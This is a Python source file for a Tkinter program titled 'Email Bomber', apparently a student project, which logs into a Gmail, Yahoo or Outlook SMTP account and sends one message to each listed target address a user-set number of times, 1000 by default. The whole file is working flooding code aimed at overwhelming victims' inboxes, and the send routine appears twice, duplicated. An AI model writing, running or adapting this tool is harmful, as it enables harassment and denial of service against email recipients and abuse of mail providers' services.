import smtplib
import tkinter as tk
from tkinter import messagebox, StringVar, OptionMenu

class EmailConnector:
    def __init__(self, gui):
        self.server = None
        self.port = None
        self.from_addr = None
        self.from_pwd = None
        self.s = None
        self.gui = gui  # Store reference to the GUI object

    def connect(self):
        try:
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.from_addr, self.from_pwd)
            return True
        except Exception as e:
            messagebox.showerror("Error", f'ERROR: {e}')
            return False

    def send_email(self, to_addr, subject, message):
        try:
            msg = f'From: {self.from_addr}\nTo: {to_addr}\nSubject: {subject}\n\n{message}'
            self.s.sendmail(self.from_addr, to_addr, msg)
            self.gui.update_status("Email sent successfully.", "green")
        except Exception as e:
            messagebox.showerror("Error", f'ERROR: {e}')

    def close_connection(self):
        if self.s:
            self.s.quit()
            self.gui.update_status("Connection closed.", "green")

class Email_Bomber_GUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Email Bomber")
        self.connector = EmailConnector(self)
        self.connected = False

        #  buttons and label
        self.button_bg_color = "#FF5733"
        self.label_fg_color = "#FFFFFF"
        self.interface_bg_color = "#1F2739"
        self.entry_bg_color = "#2C3E50"
        self.success_color = "green"

        # Set background color
        self.master.config(bg=self.interface_bg_color)

        # Email Server Dropdown
        tk.Label(master, text="Email Server:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=0)
        self.server_var = StringVar(master)
        self.server_var.set("Select Server")  # default value
        self.server_dropdown = OptionMenu(master, self.server_var, "Gmail", "Yahoo", "Outlook")
        self.server_dropdown.config(bg=self.entry_bg_color)
        self.server_dropdown.grid(row=0, column=1, pady=10)

        # Labels  Email Configuration
        tk.Label(master, text="Port:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=1)
        self.port_entry = tk.Entry(master, bg=self.entry_bg_color)
        self.port_entry.grid(row=1, column=1, pady=10)
        self.port_entry.insert(tk.END, "587")

        tk.Label(master, text="Sender's Email:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=2)
        self.from_addr_entry = tk.Entry(master, bg=self.entry_bg_color)
        self.from_addr_entry.grid(row=2, column=1, pady=10)

        tk.Label(master, text="Sender's Password:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=3)
        self.from_pwd_entry = tk.Entry(master, show="*", bg=self.entry_bg_color)
        self.from_pwd_entry.grid(row=3, column=1, pady=10)

        # Labels and Entries for Email Content
        tk.Label(master, text="Target Email:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=4)
        self.target_entry = tk.Entry(master, bg=self.entry_bg_color)
        self.target_entry.grid(row=4, column=1, pady=10)

        tk.Label(master, text="Subject:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=5)
        self.subject_entry = tk.Entry(master, bg=self.entry_bg_color)
        self.subject_entry.grid(row=5, column=1, pady=10)

        tk.Label(master, text="Message:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=6)
        self.message = tk.Text(master, height=4, width=50, bg=self.entry_bg_color)
        self.message.grid(row=6, column=1, pady=10)

        # Custom Amount Entry
        tk.Label(master, text="Custom Amount:", fg=self.label_fg_color, bg=self.interface_bg_color).grid(row=7)
        self.custom_amount_entry = tk.Entry(master, bg=self.entry_bg_color)
        self.custom_amount_entry.grid(row=7, column=1, pady=10)
        self.custom_amount_entry.insert(tk.END, "1000")

        # Button to connect
        self.connect_button = tk.Button(master, text="Connect", bg=self.button_bg_color, fg=self.label_fg_color, command=self.connect_and_enable_send)
        self.connect_button.grid(row=8, column=0, pady=10, padx=5)

        # Button to send email
        self.send_button = tk.Button(master, text="Send Email", bg=self.button_bg_color, fg=self.label_fg_color, state=tk.DISABLED, command=self.send_email)
        self.send_button.grid(row=8, column=1, pady=10, padx=5)

        # Quit Button
        self.quit_button = tk.Button(master, text="Quit", bg=self.button_bg_color, fg=self.label_fg_color, command=master.quit)
        self.quit_button.grid(row=8, column=2, pady=10, padx=5)

        # Status Bar
        self.status_bar = tk.Label(master, text="", fg=self.label_fg_color, bg=self.interface_bg_color)
        self.status_bar.grid(row=9, columnspan=3, pady=10)

        # Footer Section
        self.footer_label = tk.Label(master, text="Created in 2024 by Sandesh(220247@Softwarica) ", fg=self.label_fg_color, bg=self.interface_bg_color)
        self.footer_label.grid(row=10, columnspan=3, pady=(20, 10))

    def connect_and_enable_send(self):
        self.connector.server = self.get_server_address(self.server_var.get())
        self.connector.port = int(self.port_entry.get())
        self.connector.from_addr = self.from_addr_entry.get()
        self.connector.from_pwd = self.from_pwd_entry.get()

        if self.connector.connect():
            self.connected = True
            self.send_button.config(state=tk.NORMAL)
            self.update_status("Connected to the email server.", "green")
            messagebox.showinfo("Success", "Connected to the email server successfully.")
            return True
        else:
            messagebox.showerror("Error", "Failed to connect to the email server.")
            return False

    def send_email(self):
        if not self.connected:
            messagebox.showerror("Error", "Please connect to the email server first.")
            return

        target_emails = self.target_entry.get().split(',')  # Split emails by comma
        subject = self.subject_entry.get()
        message = self.message.get("1.0", tk.END)  # Get all content from Text widget

        custom_amount = int(self.custom_amount_entry.get())

        for email in target_emails:
            for i in range(custom_amount):
                self.connector.send_email(email.strip(), subject, message)
                self.update_status("Email sent successfully.", "green")  # Notify about successful email sending

    def close_connection(self):
        if self.connected:
            self.connector.close_connection()
            self.connected = False
            self.update_status("Connection closed.", "red")  # Notify about connection closure

    def send_email(self):
        if not self.connected:
            messagebox.showerror("Error", "Please connect to the email server first.")
            return

        target_emails = self.target_entry.get().split(',')  # Split emails by comma
        subject = self.subject_entry.get()
        message = self.message.get("1.0", tk.END)  # Get all content from Text widget

        custom_amount = int(self.custom_amount_entry.get())

        for email in target_emails:
            for i in range(custom_amount):
                self.connector.send_email(email.strip(), subject, message)
                self.update_status("Email sent successfully.", "green")  # Notify about successful email sending

    def get_server_address(self, server_name):
        if server_name == "Gmail":
            return "smtp.gmail.com"
        elif server_name == "Yahoo":
            return "smtp.mail.yahoo.com"
        elif server_name == "Outlook":
            return "smtp-mail.outlook.com"
        else:
            return ""

    def update_status(self, message, color=None):
        self.status_bar.config(text=message, fg=color if color else self.label_fg_color)

if __name__ == "__main__":
    root = tk.Tk()
    email_bomber_gui = Email_Bomber_GUI(root)
    root.mainloop()
